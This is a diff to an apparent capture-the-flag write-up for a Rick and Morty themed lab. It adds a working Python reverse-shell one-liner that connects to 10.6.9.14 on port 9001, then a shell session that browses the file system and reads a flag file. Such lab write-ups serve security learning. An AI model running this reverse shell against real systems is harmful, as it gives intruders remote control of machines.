@@ -132,3 +132,25 @@ mr. meeseek hair
 We found our first flag: mr. meeseek hair
 
 Playing around with grep . through the filesystem we found that we can run commands on the portal.php area with a post request. 
+
+export RHOST="10.6.9.14";export RPORT=9001;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
+
+$ s
+ls
+bin   etc         lib         media  proc  sbin  sys  var
+boot  home        lib64       mnt    root  snap  tmp  vmlinuz
+dev   initrd.img  lost+found  opt    run   srv   usr
+$ cd home
+cd home
+$ ls
+ls
+rick  ubuntu
+$ cd rick
+cd rick
+$ ls
+ls
+second ingredients
+$ cat "second ingredients"
+cat "second ingredients"
+1 jerry tear
+
